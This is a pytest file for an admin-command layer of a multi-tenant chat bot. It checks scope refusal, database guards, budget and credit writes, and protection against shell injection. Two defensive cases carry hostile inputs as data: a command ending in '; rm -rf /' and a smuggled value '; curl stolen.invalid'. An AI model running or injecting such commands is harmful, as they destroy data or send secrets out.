"""Real product writes/readback on lane Postgres; provider I/O is scripted."""

from __future__ import annotations

import inspect
import json
import os
import uuid
from collections.abc import AsyncIterator
from dataclasses import replace
from decimal import Decimal
from pathlib import Path
from types import SimpleNamespace
from typing import Any, cast

import pytest
from daimon.core._models import Tenant
from daimon.core.authz import Action, Place, Subject, authorize
from daimon.core.channel_backend import current_backend
from daimon.core.defaults.provisioning import provision_tenant
from daimon.core.stores import channel_budgets, routines, tenant_ledger, tenants
from daimon.core.stores.access_policy import load_access_policy
from daimon.testing.admin_bindings import (
    AdminBindings,
    AdminCommand,
    AdminReceipt,
    UnboundAdmin,
    parse_admin,
    provision_admin_run,
)
from daimon.testing.db import build_test_engine, isolated_test_schema, require_owned_sessionmaker
from mux.contracts.ids import ChannelRef, Provider, Scope
from mux.errors import ScopeViolation
from mux.testing.drivers.anthropic.ma_transport import ScriptedTransport
from sqlalchemy import event, text
from sqlalchemy.ext.asyncio import (
    AsyncConnection,
    AsyncEngine,
    AsyncSession,
    async_sessionmaker,
    create_async_engine,
)

pytest_plugins = ["daimon.testing.db"]

FIXTURE = (
    Path(__file__).resolve().parents[3] / "tests" / "judge" / "fixtures" / "admin_operations.json"
)


@pytest.fixture(params=["anthropic", "openai", "gemini"])
async def binding(
    request: pytest.FixtureRequest, db_session_factory: async_sessionmaker[AsyncSession]
) -> AsyncIterator[AdminBindings]:
    try:
        require_owned_sessionmaker(db_session_factory)
    except ValueError:
        bound = db_session_factory.kw.get("bind")
        engine = bound.engine if isinstance(bound, AsyncConnection) else bound
        if (
            isinstance(engine, AsyncEngine)
            and engine.url.get_backend_name() == "postgresql"
            and engine.url.host in ("localhost", "127.0.0.1")
            and engine.url.database == "daimon_test"
            and not engine.url.query
            and not db_session_factory.kw.get("binds")
            and not (os.environ.get("GITHUB_ACTIONS") == "true" and os.environ.get("CI") == "true")
        ):
            pytest.skip("admin proofs require a lane database or registered isolated CI schema")
        raise
    backend = cast(Provider, request.param)
    bound = await provision_admin_run(
        db_session_factory,
        workspace_id="123456789012345678",
        backend=backend,
        channels=frozenset({"223456789012345678", "323456789012345678"}),
        trace=ScriptedTransport(),
    )
    try:
        yield bound
    finally:
        await bound.close()


def source(command: str) -> dict[str, Any]:
    return {"do": "admin", "tool": "cli", "args": command}


async def invoke(binding: AdminBindings, command: str) -> AdminReceipt:
    return await binding.execute(
        source(command),
        {
            "guild_id": binding.workspace_id,
            "channel_id": min(binding.channels),
            "env.qa_user_id": "423456789012345678",
        },
    )


async def test_product_provisioning_and_configuration_are_idempotent(
    binding: AdminBindings,
) -> None:
    channel_id = min(binding.channels)
    first = await binding.configure_channel(channel_id)
    again = await binding.configure_channel(channel_id)
    assert first == again and first.observations["revision"] == 1
    tenant_id = binding.scope.tenant_id
    second = await provision_tenant(
        binding.sessions, platform="discord", workspace_id=binding.workspace_id
    )
    assert str(second.tenant_id) == tenant_id and str(second.account_id) == binding.scope.account_id
    async with binding.sessions() as session:
        revision = await current_backend(
            session, ChannelRef(tenant_id=tenant_id, platform="discord", channel_id=channel_id)
        )
    assert revision is not None and revision.backend == binding.backend
    assert not binding.trace.requests


async def test_writers_none_is_real_admission_policy_and_teardown_restores_it(
    binding: AdminBindings,
) -> None:
    receipt = await invoke(
        binding, "daimon channels rule set discord {guild_id} {channel_id} --writers none"
    )
    assert receipt.status == "executed" and receipt.observations["writers"] == "none"
    async with binding.sessions() as session:
        policy = await load_access_policy(session, tenant_id=uuid.UUID(binding.scope.tenant_id))
    decision = authorize(
        policy,
        subject=Subject(is_admin=True),
        action=Action.START_TURN,
        place=Place(channel_id=min(binding.channels)),
    )
    assert not decision and decision.reason == "writers_none"
    await invoke(binding, "daimon channels rule set discord {guild_id} {channel_id} --writers any")
    async with binding.sessions() as session:
        restored = await load_access_policy(session, tenant_id=uuid.UUID(binding.scope.tenant_id))
    assert authorize(
        restored,
        subject=Subject(is_admin=True),
        action=Action.START_TURN,
        place=Place(channel_id=min(binding.channels)),
    )
    assert not binding.trace.requests


async def test_budget_write_and_clear_have_real_readback(binding: AdminBindings) -> None:
    receipt = await invoke(
        binding, "daimon channels budget set discord {guild_id} {channel_id} 0.01 --window total"
    )
    assert receipt.status == "executed"
    async with binding.sessions() as session:
        budget = await channel_budgets.get_channel_budget(
            session,
            tenant_id=uuid.UUID(binding.scope.tenant_id),
            platform="discord",
            channel_id=min(binding.channels),
        )
    assert budget is not None and budget.limit_usd == Decimal("0.01") and budget.window == "total"
    removed = await invoke(binding, "daimon channels budget clear discord {guild_id} {channel_id}")
    assert removed.observations == {"budget": None}
    assert not binding.trace.requests


async def test_turn_cap_restore_uses_product_override(binding: AdminBindings) -> None:
    receipt = await invoke(binding, "daimon tenants turn-cap discord {guild_id} 2")
    assert receipt.observations == {"turn_cap": 2}
    assert (
        await tenants.get_turn_cap(
            binding.sessions, tenant_id=uuid.UUID(binding.scope.tenant_id), default=8
        )
        == 2
    )
    restored = await invoke(binding, "daimon tenants turn-cap discord {guild_id} default")
    assert restored.observations == {"turn_cap": None}
    assert (
        await tenants.get_turn_cap(
            binding.sessions, tenant_id=uuid.UUID(binding.scope.tenant_id), default=8
        )
        == 8
    )


async def test_routine_teardown_only_removes_owned_channel_and_tenant(
    binding: AdminBindings,
) -> None:
    tenant_id = uuid.UUID(binding.scope.tenant_id)
    target, other_channel = sorted(binding.channels)
    foreign = await provision_tenant(
        binding.sessions, platform="discord", workspace_id="523456789012345678"
    )
    async with binding.sessions() as session, session.begin():
        owned = await routines.create_routine(
            session,
            tenant_id=tenant_id,
            created_by_user_id=None,
            agent_id="fixture-native-agent",
            agent_name="daimon",
            cron_expr="0 * * * *",
            timezone_="UTC",
            trigger_message="fixture reminder",
            channel_id=target,
        )
        other = await routines.create_routine(
            session,
            tenant_id=tenant_id,
            created_by_user_id=None,
            agent_id="fixture-native-agent",
            agent_name="daimon",
            cron_expr="0 * * * *",
            timezone_="UTC",
            trigger_message="fixture reminder",
            channel_id=other_channel,
        )
        outside = await routines.create_routine(
            session,
            tenant_id=foreign.tenant_id,
            created_by_user_id=None,
            agent_id="fixture-native-agent",
            agent_name="daimon",
            cron_expr="0 * * * *",
            timezone_="UTC",
            trigger_message="fixture reminder",
            channel_id=target,
        )
    receipt = await binding.execute(
        {"do": "admin", "tool": "delete_routines", "args": {"channel": "{channel_id}"}},
        {"channel_id": target},
    )
    assert receipt.status == "executed" and receipt.observations["deleted"] == [str(owned.id)]
    async with binding.sessions() as session:
        assert [
            r.id for r in await routines.list_routines_for_tenant(session, tenant_id=tenant_id)
        ] == [other.id]
        assert [
            r.id
            for r in await routines.list_routines_for_tenant(session, tenant_id=foreign.tenant_id)
        ] == [outside.id]
    again = await binding.execute(
        {"do": "admin", "tool": "delete_routines", "args": {"channel": target}}, {}
    )
    assert again.observations["deleted"] == []


@pytest.mark.parametrize(
    "command",
    [
        "daimon channels rule set discord {guild_id} {channel_id} --readers own --copy-from daimon",
        "daimon channels skills add discord {guild_id} {channel_id} notes",
        "daimon skills --guild {guild_id} delete qa-echo-skill --yes",
    ],
)
async def test_missing_resource_edge_is_typed_pending_without_io(
    binding: AdminBindings, command: str
) -> None:
    receipt = await invoke(binding, command)
    assert receipt.status == "pending" and receipt.code == "ADMIN_RESOURCE_EDGE_UNBOUND"
    assert not binding.trace.requests


async def test_frozen_credit_draining_does_not_forge_a_ledger_write(binding: AdminBindings) -> None:
    row = next(
        row
        for row in json.loads(FIXTURE.read_text())["scenarios"]
        if row["scenario_id"] == "QA-NEW16-TENANT-CREDIT-DEPLETED-COPY"
    )
    receipt = await binding.execute(
        row["operations"][0]["source"],
        {"env.qa_drain_guild_id": binding.workspace_id, "nonce": "fixture"},
    )
    assert receipt.status == "pending" and receipt.code == "ADMIN_CREDIT_SOURCE_NOT_EXECUTABLE"
    async with binding.sessions() as session:
        assert (
            await tenant_ledger.get_balance(session, tenant_id=uuid.UUID(binding.scope.tenant_id))
            == 0
        )
    assert not binding.trace.requests


@pytest.mark.parametrize(
    "command",
    [
        "daimon channels rule set discord foreign {channel_id} --writers none",
        "daimon channels rule set discord {guild_id} 923456789012345678 --writers none",
        "daimon tenants turn-cap slack {guild_id} 2",
    ],
)
async def test_foreign_destination_is_refused_before_mutation(
    binding: AdminBindings, command: str
) -> None:
    with pytest.raises(ScopeViolation):
        await invoke(binding, command)
    assert not binding.trace.requests


async def test_foreign_account_and_unscoped_context_are_refused(binding: AdminBindings) -> None:
    foreign = await provision_tenant(
        binding.sessions, platform="discord", workspace_id="623456789012345678"
    )
    for scope in (
        binding.scope.model_copy(update={"account_id": str(foreign.account_id)}),
        Scope.platform(reason="forbidden qa"),
    ):
        refused = replace(binding, scope=scope)
        try:
            with pytest.raises(ScopeViolation):
                await refused.configure_channel(min(binding.channels))
        finally:
            await refused.close()
    assert not binding.trace.requests


@pytest.mark.parametrize(
    "command",
    [
        "daimon channels rule set discord {guild_id} {channel_id} --writers {missing}",
        "daimon channels rule set discord {guild_id} {channel_id} --header SECRET",
        "daimon channels rule set discord {guild_id} {channel_id} --writers none --writers any",
        "daimon channels rule set discord {guild_id} {channel_id} --writers any ; rm -rf /",
    ],
)
async def test_unknown_syntax_remains_pending_no_shell_or_io(
    binding: AdminBindings, command: str
) -> None:
    receipt = await invoke(binding, command)
    assert receipt.status == "pending"
    assert not binding.trace.requests


async def test_fixture_value_cannot_inject_additional_shell_tokens(binding: AdminBindings) -> None:
    receipt = await binding.execute(
        source(
            "daimon channels rule set discord {guild_id} {channel_id} --writers {env.qa_user_id}"
        ),
        {
            "channel_id": min(binding.channels),
            "env.qa_user_id": "any --writers none; curl stolen.invalid",
        },
    )
    assert receipt.status == "pending" and receipt.code == "ADMIN_RULE_VALUE_UNBOUND"
    assert not binding.trace.requests


async def test_native_platform_permission_and_token_steps_remain_pending(
    binding: AdminBindings,
) -> None:
    for step in (
        {
            "do": "admin",
            "tool": "discord_overwrite",
            "args": {"target": "daimon_bot", "deny": ["CREATE_PUBLIC_THREADS"]},
        },
        {
            "do": "admin",
            "tool": "headless",
            "args": {
                "call": "credential_submit.mcp_token",
                "token": "wrong-token-123",
                "url": "https://fixture.invalid",
            },
        },
    ):
        receipt = await binding.execute(step, {})
        assert receipt.status == "pending" and not receipt.observations
    assert not binding.trace.requests


def test_frozen_admin_source_pin_and_operation_coverage() -> None:
    snapshot = json.loads(FIXTURE.read_text())
    assert (
        snapshot["target_sha256"]
        == "fc14eab684b6aa257ca5c01ab113ef154c9847938d263f2739480299c43cc2f4"
    )
    assert len(snapshot["scenarios"]) == 19
    values = {
        "guild_id": "123456789012345678",
        "channel_id": "223456789012345678",
        "channel:A": "223456789012345678",
        "channel:B": "323456789012345678",
        "env.qa_user_id": "423456789012345678",
        "env.qa_drain_guild_id": "123456789012345678",
        "env.qa_library_skill": "library",
        "env.qa_base_with_own_skill": "skill-source",
        "nonce": "fixture",
        "fork.name": "fork",
    }
    pending: list[tuple[str, str]] = []
    parsed: list[AdminCommand] = []
    for row in snapshot["scenarios"]:
        assert len(row["source_sha256"]) == 64
        for invocation in row["operations"]:
            try:
                parsed.append(parse_admin(invocation["source"], values))
            except UnboundAdmin as error:
                pending.append((row["scenario_id"], error.code))
    assert len(parsed) == 34 and pending == [
        ("QA-NEW14-MISSING-THREAD-PERMISSION-COPY", "ADMIN_PLATFORM_EDGE_UNBOUND"),
        ("QA-NEW17-MCP-USABLE-NEXT-MESSAGE", "ADMIN_CLI_OPERATION_UNBOUND"),
        ("QA-NEW18-SKILL-ADD-YES-PLEASE", "ADMIN_CLI_OPERATION_UNBOUND"),
        ("QA-NEW27-MISTYPED-TOKEN-HEADLESS", "ADMIN_TOOL_UNBOUND"),
    ]
    assert all("{" not in (command.channel_id or "") for command in parsed)


async def test_named_channel_reference_preserves_owned_destination(binding: AdminBindings) -> None:
    target = max(binding.channels)
    receipt = await binding.execute(
        source("daimon channels rule set discord {guild_id} {channel:A} --writers none"),
        {"channel:A": target},
    )
    assert receipt.status == "executed" and receipt.observations["writers"] == "none"
    async with binding.sessions() as session:
        policy = await load_access_policy(session, tenant_id=uuid.UUID(binding.scope.tenant_id))
    assert policy.channel_rules[target].writers == "none"
    assert min(binding.channels) not in policy.channel_rules


@pytest.mark.parametrize(
    "scenario_id",
    [
        "QA-NEW13-WRITERS-NONE-NOT-SILENT",
        "QA-NEW15-CHANNEL-BUDGET-EXHAUSTED",
        "QA-NEW6-TENANT-CAP-QUEUE",
        "QA-NEW22-ROUTINE-OUTPUT-NOT-TRUNCATED",
        "QA-NEW23-ROUTINE-WITHOUT-DESTINATION",
        "QA-NEW35-ROUTINE-FAILURE-IS-REPORTED",
    ],
)
async def test_exact_frozen_common_admin_operations_execute(
    binding: AdminBindings, scenario_id: str
) -> None:
    # Operation proof only: host turns/assertions are the runner's separate work.
    row = next(
        row
        for row in json.loads(FIXTURE.read_text())["scenarios"]
        if row["scenario_id"] == scenario_id
    )
    receipts = [
        await binding.execute(invocation["source"], {"channel_id": min(binding.channels)})
        for invocation in row["operations"]
    ]
    assert all(receipt.status == "executed" for receipt in receipts)
    assert all(receipt.backend == binding.backend for receipt in receipts)
    assert not binding.trace.requests


@pytest.mark.parametrize(
    "command",
    [
        "daimon channels admins set discord {guild_id} {channel_id}",
        "daimon channels rule set discord {guild_id} {channel_id} --writers unknown",
        "daimon tenants turn-cap discord {guild_id} 02",
        "daimon tenants turn-cap discord {guild_id} 0",
    ],
)
async def test_unbound_semantics_stay_pending_before_mutation(
    binding: AdminBindings, command: str
) -> None:
    receipt = await invoke(binding, command)
    assert receipt.status == "pending" and receipt.code is not None
    assert not binding.trace.requests


async def test_non_lane_database_refuses_before_any_connection() -> None:
    from sqlalchemy.ext.asyncio import create_async_engine

    engine = create_async_engine("postgresql+asyncpg://offline:fixture@127.0.0.1/operator_database")
    sessions = async_sessionmaker(engine)
    try:
        with pytest.raises(ValueError, match="owned local lane engines"):
            await provision_admin_run(
                sessions,
                workspace_id="123",
                backend="anthropic",
                channels=frozenset(),
                trace=ScriptedTransport(),
            )
    finally:
        await engine.dispose()


@pytest.mark.parametrize("bind_kind", ["engine", "connection"])
@pytest.mark.parametrize(
    "database,host,query,schema_kind,registered,github_actions,ci",
    [
        ("daimon_test", "localhost", "", "worker", True, None, "true"),
        ("daimon_test", "localhost", "", "worker", True, "true", None),
        ("daimon_test", "localhost", "", "worker", True, "false", "true"),
        ("daimon_test", "localhost", "", "worker", True, "true", "false"),
        ("daimon_test", "localhost", "", "worker", True, "True", "true"),
        ("daimon_test", "localhost", "", "worker", True, "true", "TRUE"),
        ("daimon_test", "localhost", "", "worker", False, "true", "true"),
        ("daimon_test", "localhost", "", "public", True, "true", "true"),
        ("daimon_test", "localhost", "", "custom", True, "true", "true"),
        ("daimon_test", "localhost", "", "foreign", True, "true", "true"),
        ("daimon_test", "localhost", "", "bad_nonce", True, "true", "true"),
        ("operator_database", "localhost", "", "worker", True, "true", "true"),
        ("daimon_test_nc_", "localhost", "", "worker", True, "true", "true"),
        ("daimon_test_nc_n6-other", "localhost", "", "worker", True, "true", "true"),
        ("daimon_test_nc_n6", "remote.invalid", "", "worker", True, "true", "true"),
        ("daimon_test", "remote.invalid", "", "worker", True, "true", "true"),
        ("daimon_test_nc_n6", "localhost", "?host=remote.invalid", "worker", True, "true", "true"),
        (
            "daimon_test_nc_n6",
            "localhost",
            "?database=operator_database",
            "worker",
            True,
            "true",
            "true",
        ),
        ("daimon_test", "localhost", "?host=remote.invalid", "worker", True, "true", "true"),
        ("daimon_test", "localhost", "?database=operator_database", "worker", True, "true", "true"),
    ],
)
async def test_database_guards_refuse_both_admin_apis_before_io(
    monkeypatch: pytest.MonkeyPatch,
    bind_kind: str,
    database: str,
    host: str,
    query: str,
    schema_kind: str,
    registered: bool,
    github_actions: str | None,
    ci: str | None,
) -> None:
    schemas = {
        "worker": f"test_w{os.getpid()}_1234abcd",
        "public": "public",
        "custom": "qa_custom",
        "foreign": f"test_w{os.getpid() + 1000000}_1234abcd",
        "bad_nonce": f"test_w{os.getpid()}_abc",
    }
    for flag, value in (("GITHUB_ACTIONS", github_actions), ("CI", ci)):
        if value is None:
            monkeypatch.delenv(flag, raising=False)
        else:
            monkeypatch.setenv(flag, value)
    url = f"postgresql+asyncpg://offline:fixture@{host}/{database}{query}"
    engine = (
        build_test_engine(url, schemas[schema_kind])
        if registered
        else create_async_engine(
            url, execution_options={"isolated_test_schema": schemas[schema_kind]}
        )
    )
    connections: list[None] = []

    def forbid_connection(*_args: object, **_kwargs: object) -> None:
        connections.append(None)
        raise AssertionError("database guard attempted a connection")

    event.listen(engine.sync_engine, "do_connect", forbid_connection)
    bind = engine if bind_kind == "engine" else AsyncConnection(engine)
    sessions = async_sessionmaker(bind, expire_on_commit=False)
    bound = AdminBindings(
        sessions=sessions,
        scope=Scope.platform(reason="must refuse DB before checking scope"),
        backend="anthropic",
        platform="discord",
        workspace_id="123",
        channels=frozenset({"456"}),
        trace=ScriptedTransport(),
    )
    try:
        with pytest.raises(ValueError, match="owned local lane engines"):
            await provision_admin_run(
                sessions,
                workspace_id="123",
                backend="anthropic",
                channels=frozenset({"456"}),
                trace=bound.trace,
            )
        with pytest.raises(ValueError, match="owned local lane engines"):
            await bound.configure_channel("456")
        assert connections == [] and bound.trace.requests == []
    finally:
        await bound.close()
        await engine.dispose()


@pytest.mark.parametrize("schema_kind", ["w", "f"])
@pytest.mark.parametrize("bind_kind", ["engine", "connection"])
async def test_registered_ci_schema_passes_db_guard_but_retains_scope_refusal(
    monkeypatch: pytest.MonkeyPatch, schema_kind: str, bind_kind: str
) -> None:
    monkeypatch.setenv("GITHUB_ACTIONS", "true")
    monkeypatch.setenv("CI", "true")
    engine = build_test_engine(
        "postgresql+asyncpg://offline:fixture@localhost/daimon_test",
        f"test_{schema_kind}{os.getpid()}_1234abcd",
    )
    connections: list[None] = []

    def forbid_connection(*_args: object, **_kwargs: object) -> None:
        connections.append(None)
        raise AssertionError("scope refusal attempted a connection")

    event.listen(engine.sync_engine, "do_connect", forbid_connection)
    bound = AdminBindings(
        sessions=async_sessionmaker(
            engine if bind_kind == "engine" else AsyncConnection(engine), expire_on_commit=False
        ),
        scope=Scope.platform(reason="CI must still reject platform authorization"),
        backend="anthropic",
        platform="discord",
        workspace_id="123",
        channels=frozenset({"456"}),
        trace=ScriptedTransport(),
    )
    try:
        with pytest.raises(ScopeViolation, match="explicit tenant authorization required"):
            await bound.configure_channel("456")
        assert connections == [] and bound.trace.requests == []
    finally:
        await bound.close()
        await engine.dispose()


@pytest.mark.parametrize("bind_kind", ["engine", "connection"])
async def test_isolated_ci_real_product_provisioning_and_readback(
    binding: AdminBindings,
    db_engine: AsyncEngine,
    monkeypatch: pytest.MonkeyPatch,
    bind_kind: str,
) -> None:
    # Only displayed URL metadata changes. The original builder's pool/startup
    # settings keep the original test DB and schema (the lane DB locally).
    actual_database = db_engine.url.database
    actual_schema = isolated_test_schema(db_engine)
    assert actual_schema is not None and str(os.getpid()) in actual_schema
    monkeypatch.setenv("GITHUB_ACTIONS", "true")
    monkeypatch.setenv("CI", "true")
    monkeypatch.setattr(db_engine.sync_engine, "url", db_engine.url.set(database="daimon_test"))
    sessions = (
        binding.sessions
        if bind_kind == "connection"
        else async_sessionmaker(db_engine, expire_on_commit=False)
    )
    bound = await provision_admin_run(
        sessions,
        workspace_id=binding.workspace_id,
        backend=binding.backend,
        channels=binding.channels,
        trace=binding.trace,
    )
    try:
        assert bound.scope.tenant_id == binding.scope.tenant_id
        assert bound.scope.account_id == binding.scope.account_id
        receipt = await bound.configure_channel(min(bound.channels))
        assert receipt.status == "executed" and receipt.backend == binding.backend
        async with sessions() as session:
            database, schema = (
                await session.execute(text("SELECT current_database(), current_schema()"))
            ).one()
            stored = await current_backend(
                session,
                ChannelRef(
                    tenant_id=bound.scope.tenant_id,
                    platform=bound.platform,
                    channel_id=min(bound.channels),
                ),
            )
        assert database == actual_database and schema == actual_schema
        assert stored is not None and stored.backend == bound.backend
        assert not bound.trace.requests
    finally:
        await bound.close()


@pytest.mark.parametrize(
    "name",
    [
        "ANTHROPIC_WEBHOOK_SIGNING_KEY",
        "ANTHROPIC_CUSTOM_HEADERS",
        "ANTHROPIC_API_KEY",
        "ANTHROPIC_AUTH_TOKEN",
        "ANTHROPIC_BASE_URL",
        "ANTHROPIC_PROFILE",
        "ANTHROPIC_CONFIG_DIR",
        "ANTHROPIC_IDENTITY_TOKEN",
        "ANTHROPIC_IDENTITY_TOKEN_FILE",
        "ANTHROPIC_FEDERATION_RULE_ID",
        "ANTHROPIC_ORGANIZATION_ID",
        "ANTHROPIC_LOG",
        "ANTHROPIC_FUTURE_OVERRIDE",
    ],
)
@pytest.mark.parametrize("value", ["", "synthetic-sdk-override"])
async def test_sdk_environment_refuses_before_http_allocation_or_provisioning(
    monkeypatch: pytest.MonkeyPatch, name: str, value: str, caplog: pytest.LogCaptureFixture
) -> None:
    engine = create_async_engine("postgresql+asyncpg://offline:fixture@localhost/daimon_test_nc_n6")
    allocations: list[None] = []
    connections: list[None] = []

    def forbid_http(*_args: object, **_kwargs: object) -> None:
        allocations.append(None)
        raise AssertionError("ambient SDK configuration reached HTTP allocation")

    def forbid_connection(*_args: object, **_kwargs: object) -> None:
        connections.append(None)
        raise AssertionError("ambient SDK configuration reached DB connection")

    event.listen(engine.sync_engine, "do_connect", forbid_connection)
    monkeypatch.setattr("daimon.testing.admin_bindings.httpx.AsyncClient", forbid_http)
    monkeypatch.setenv(name, value)
    caplog.set_level("DEBUG")
    sessions = async_sessionmaker(engine)
    trace = ScriptedTransport()
    try:
        with pytest.raises(ValueError, match="ambient") as error:
            AdminBindings(
                sessions=sessions,
                scope=Scope.platform(reason="constructor-only environment refusal"),
                backend="anthropic",
                platform="discord",
                workspace_id="123",
                channels=frozenset(),
                trace=trace,
            )
        with pytest.raises(ValueError, match="ambient"):
            await provision_admin_run(
                sessions,
                workspace_id="123",
                backend="anthropic",
                channels=frozenset(),
                trace=trace,
            )
        assert "synthetic-sdk-override" not in str(error.value) + caplog.text
        assert name in os.environ  # Refusal does not erase caller configuration.
        assert connections == allocations == [] and trace.requests == []
    finally:
        await engine.dispose()


@pytest.mark.parametrize("name", ["ANTHROPIC_WEBHOOK_SIGNING_KEY", "ANTHROPIC_CUSTOM_HEADERS"])
@pytest.mark.parametrize("value", ["", "x-synthetic-secret: synthetic-sdk-override"])
@pytest.mark.parametrize("method", ["copy", "with_options"])
async def test_actual_sdk_copies_refuse_late_environment(
    binding: AdminBindings,
    monkeypatch: pytest.MonkeyPatch,
    name: str,
    value: str,
    method: str,
    caplog: pytest.LogCaptureFixture,
) -> None:
    monkeypatch.setenv(name, value)
    caplog.set_level("DEBUG")
    with pytest.raises(ValueError, match="ambient") as error:
        if method == "copy":
            binding.anthropic.copy()
        else:
            binding.anthropic.with_options()
    # A DB-only operation must also refuse before its authorization read/writes.
    with pytest.raises(ValueError, match="ambient"):
        await binding.configure_channel(min(binding.channels))
    assert "synthetic-sdk-override" not in str(error.value) + caplog.text
    assert name in os.environ and not binding.trace.requests


async def test_actual_sdk_copy_keeps_explicit_offline_credentials_and_headers(
    binding: AdminBindings,
) -> None:
    copied = binding.anthropic.with_options(default_headers={"x-offline-proof": "fixture"})
    try:
        assert isinstance(copied, type(binding.anthropic))
        assert copied.api_key == "offline-fixture" and copied.auth_token is None
        assert copied.credentials is None and copied.webhook_key is None
        assert copied.base_url.scheme == "https" and copied.base_url.host == "anthropic.invalid"
        assert copied.default_headers["x-offline-proof"] == "fixture"
        assert not binding.trace.requests
    finally:
        await copied.close()


@pytest.mark.parametrize("bind_kind", ["engine", "connection"])
@pytest.mark.parametrize("foreign_first", [False, True])
@pytest.mark.parametrize(
    "foreign_url",
    [
        "postgresql+asyncpg://offline:fixture@localhost/operator_database",
        "postgresql+asyncpg://offline:fixture@localhost/daimon_test",
        "postgresql+asyncpg://offline:fixture@remote.invalid/daimon_test_nc_n6",
        "postgresql+asyncpg://offline:fixture@localhost/daimon_test_nc_n6?host=remote.invalid",
    ],
)
async def test_every_model_bind_is_checked_before_provision_or_authorization(
    monkeypatch: pytest.MonkeyPatch,
    bind_kind: str,
    foreign_first: bool,
    foreign_url: str,
) -> None:
    monkeypatch.setenv("GITHUB_ACTIONS", "true")
    monkeypatch.setenv("CI", "true")
    owned = create_async_engine("postgresql+asyncpg://offline:fixture@localhost/daimon_test_nc_n6")
    foreign = create_async_engine(foreign_url)
    connections: list[None] = []

    def forbid_connection(*_args: object, **_kwargs: object) -> None:
        connections.append(None)
        raise AssertionError("per-model bind guard attempted a connection")

    for engine in (owned, foreign):
        event.listen(engine.sync_engine, "do_connect", forbid_connection)
    routed = foreign if bind_kind == "engine" else AsyncConnection(foreign)
    entries = [(Tenant, routed), (Tenant.__table__, owned)]
    if not foreign_first:
        entries.reverse()
    sessions = async_sessionmaker(owned, binds=dict(entries), expire_on_commit=False)
    bound = AdminBindings(
        sessions=sessions,
        scope=Scope.platform(reason="bind guard must run before authorization"),
        backend="anthropic",
        platform="discord",
        workspace_id="123",
        channels=frozenset({"456"}),
        trace=ScriptedTransport(),
    )
    try:
        with pytest.raises(ValueError, match="owned local lane engines"):
            await provision_admin_run(
                sessions,
                workspace_id="123",
                backend="anthropic",
                channels=bound.channels,
                trace=bound.trace,
            )
        with pytest.raises(ValueError, match="owned local lane engines"):
            await bound.configure_channel("456")
        assert not connections and not bound.trace.requests
    finally:
        await bound.close()
        await owned.dispose()
        await foreign.dispose()


@pytest.mark.parametrize("bind_kind", ["engine", "connection"])
async def test_owned_model_routing_still_provisions_and_reads_product_state(
    binding: AdminBindings,
    bind_kind: str,
) -> None:
    original = binding.sessions.kw["bind"]
    engine = original.engine if isinstance(original, AsyncConnection) else original
    assert isinstance(engine, AsyncEngine)
    routed = original if bind_kind == "connection" else engine
    sessions = async_sessionmaker(routed, binds={Tenant: routed}, expire_on_commit=False)
    bound = await provision_admin_run(
        sessions,
        workspace_id=str(uuid.uuid4().int)[:18],
        backend=binding.backend,
        channels=binding.channels,
        trace=binding.trace,
    )
    try:
        assert bound.scope.tenant_id and bound.scope.account_id
        assert (await bound.configure_channel(min(bound.channels))).status == "executed"
    finally:
        await bound.close()


@pytest.mark.parametrize("provider", ["anthropic", "openai", "gemini"])
@pytest.mark.parametrize("bind_kind", ["engine", "connection"])
@pytest.mark.parametrize(
    ("actions", "ci"),
    [
        (None, None),
        ("true", None),
        (None, "true"),
        ("true", "false"),
        ("false", "true"),
        ("TRUE", "true"),
        ("true", "true"),
    ],
)
async def test_actual_binding_fixture_skips_plain_local_database_outside_exact_ci(
    monkeypatch: pytest.MonkeyPatch,
    provider: str,
    bind_kind: str,
    actions: str | None,
    ci: str | None,
) -> None:
    for name, value in (("GITHUB_ACTIONS", actions), ("CI", ci)):
        if value is None:
            monkeypatch.delenv(name, raising=False)
        else:
            monkeypatch.setenv(name, value)
    engine = create_async_engine("postgresql+asyncpg://offline:fixture@localhost/daimon_test")
    connections: list[None] = []

    def forbid_connection(*args: object, **kwargs: object) -> None:
        connections.append(None)
        raise AssertionError("contributor fixture attempted a database connection")

    event.listen(engine.sync_engine, "do_connect", forbid_connection)
    sessions = async_sessionmaker(
        engine if bind_kind == "engine" else AsyncConnection(engine), expire_on_commit=False
    )
    fixture = inspect.unwrap(binding)
    generator = fixture(SimpleNamespace(param=provider), sessions)
    expected = ValueError if actions == ci == "true" else pytest.skip.Exception
    try:
        with pytest.raises(expected, match="owned local|lane database"):
            await anext(generator)
        assert not connections
    finally:
        await generator.aclose()
        await engine.dispose()


@pytest.mark.parametrize("provider", ["anthropic", "openai", "gemini"])
async def test_actual_binding_fixture_does_not_skip_foreign_per_model_bind(
    monkeypatch: pytest.MonkeyPatch, provider: str
) -> None:
    monkeypatch.delenv("GITHUB_ACTIONS", raising=False)
    monkeypatch.delenv("CI", raising=False)
    shared = create_async_engine("postgresql+asyncpg://offline:fixture@localhost/daimon_test")
    foreign = create_async_engine(
        "postgresql+asyncpg://offline:fixture@localhost/operator_database"
    )
    connections: list[None] = []

    def forbid_connection(*args: object, **kwargs: object) -> None:
        connections.append(None)
        raise AssertionError("foreign fixture attempted a database connection")

    event.listen(shared.sync_engine, "do_connect", forbid_connection)
    event.listen(foreign.sync_engine, "do_connect", forbid_connection)
    sessions = async_sessionmaker(shared, binds={Tenant: foreign}, expire_on_commit=False)
    generator = inspect.unwrap(binding)(SimpleNamespace(param=provider), sessions)
    try:
        with pytest.raises(ValueError, match="owned local"):
            await anext(generator)
        assert not connections
    finally:
        await generator.aclose()
        await foreign.dispose()
        await shared.dispose()


@pytest.mark.parametrize(
    ("amount", "normalized"), [("2.50", "2.50"), ("0.01", "0.01"), ("1e1", "10.00")]
)
async def test_literal_positive_credit_uses_cli_identity_and_real_ledger_readback(
    binding: AdminBindings, amount: str, normalized: str
) -> None:
    tenant_id = uuid.UUID(binding.scope.tenant_id)
    foreign = await provision_tenant(
        binding.sessions, platform="discord", workspace_id="823456789012345678"
    )
    command = (
        f"daimon tenants credit discord {{guild_id}} {amount}"
        ' --note " QA_Trial / Grant! " --id qa-credit-fixture'
    )
    receipt = await invoke(binding, command)
    again = await invoke(binding, command)
    assert receipt.status == again.status == "executed"
    assert receipt.observations["inserted"] is True
    assert again.observations["inserted"] is False
    key = f"manual:credit:{tenant_id}:qa-trial-grant:usd{normalized}:qa-credit-fixture"
    async with binding.sessions() as session:
        rows = await tenant_ledger.list_for_tenant(session, tenant_id=tenant_id)
        balance = await tenant_ledger.get_balance(session, tenant_id=tenant_id)
        foreign_rows = await tenant_ledger.list_for_tenant(session, tenant_id=foreign.tenant_id)
    assert len(rows) == 1 and rows[0].idempotency_key == key
